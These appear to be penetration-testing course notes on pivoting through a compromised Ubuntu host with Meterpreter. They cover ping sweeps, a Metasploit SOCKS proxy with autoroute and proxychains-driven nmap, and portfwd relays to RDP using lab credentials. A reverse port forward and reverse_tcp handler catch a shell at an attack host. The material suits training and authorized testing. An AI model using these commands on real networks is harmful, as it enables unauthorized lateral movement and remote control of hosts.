- Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to **perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter** sessions bring us.

- Ping Sweep:
	- `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`
- Ping Sweep For Loop on Linux Pivot Hosts:
	- `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
- Ping Sweep For Loop Using CMD:
	- `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
- Ping Sweep Using PowerShell:
	- `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}`

- There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies.
- Instead of using SSH for port forwarding, **we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy** on our attack host.
- We will configure the SOCKS proxy for `SOCKS version 4a`.
- This SOCKS **configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter** session.
# Configuring MSF's SOCKS Proxy
---
- `use auxiliary/server/socks_proxy`
- `set SRVPORT 9050`
- `set SRVHOST 0.0.0.0`
- `set version 4a`
- `run`

- #### Confirming Proxy Server is Running:
	- `jobs`
	  
- After initiating the SOCKS server, **we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host**. 
- We can add the below line at the end of our `proxychains.conf` file located at `/etc/proxychains.conf` if it isn't already there.

- Finally, **we need to tell our socks_proxy module to route all the traffic via our Meterpreter session**. 
- We can use the **`post/multi/manage/autoroute` module from Metasploit** to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

- Creating Routes with AutoRoute:
	- `use post/multi/manage/autoroute`
	- `set SESSION 1`
	- `set SUBNET 172.16.5.0`
	- `run`
- It is **also possible** to add routes with autoroute **by running autoroute from the Meterpreter session**:
	- `run autoroute -s 172.16.5.0/23`

- Listing Active Routes with AutoRoute:
	- `run autoroute -p`

- Testing Proxy & Routing Functionality:
	- `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`

# Port Forwarding
---
- Port forwarding can also be accomplished **using Meterpreter's `portfwd` module**

- Creating Local TCP Relay:
	- `portfwd add -l 3300 -p 3389 -r 172.16.5.19`
- The above command requests the Meterpreter session to start a **listener on our attack host's local port (`-l`) `3300`** and forward all the packets to the **remote (`-r`) Windows server `172.16.5.19` on `3389` port** (`-p`) via our Meterpreter session.

- Connecting to Windows Target through localhost:
	- `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`

# Meterpreter Reverse Port Forwarding
---
- Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, **where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.**
- We will start a **listener on a new port on our attack host for Windows** and **request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234`** to **our listener on port `8081`.**

- Reverse Port Forwarding Rules:
	- `portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`
- Configuring & Starting multi/handler:
	- `set payload windows/x64/meterpreter/reverse_tcp`
	- `set LPORT 8081 `
	- `set LHOST 0.0.0.0 `
	- `run`

- We can now create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.